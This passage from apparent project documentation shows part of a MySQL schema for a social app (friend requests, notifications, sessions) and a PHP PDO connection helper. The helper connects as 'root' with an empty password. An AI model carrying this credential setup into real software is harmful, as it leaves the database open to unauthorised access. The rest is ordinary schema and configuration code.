  `receiver_id` int NOT NULL,
  `status` enum('pending','accepted','rejected') DEFAULT 'pending',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (`sender_id`) REFERENCES `users`(`id`) ON DELETE CASCADE,
  FOREIGN KEY (`receiver_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `notifications` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `user_id` int NOT NULL,
  `message` varchar(255) NOT NULL,
  `type` varchar(50) DEFAULT 'general',
  `link` varchar(255) DEFAULT NULL,
  `is_read` tinyint(1) DEFAULT 0,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (`user_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `sessions` (
  `session_id` varchar(128) NOT NULL PRIMARY KEY,
  `user_id` int NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `user_agent` varchar(255) NOT NULL,
  `last_active` datetime DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (`user_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);
```

25.3 Appendix C: Central Utility Configurations
--------------------------------------------------------------------------------
Below is the core DB helper (`db_helper.php`) used globally.

```php
<?php
// includes/db_helper.php
$host = 'localhost';
$dbname = 'nexlace_db';
$user = 'root';
$pass = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $user, $pass);
    // Enable strict error reporting
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // Return objects as associative arrays natively
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    // Disable emulated prepared statements for proper SQL injection defense
    $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
} catch (PDOException $e) {
    die("Database connection failed. Check config details.");
}
?>
```
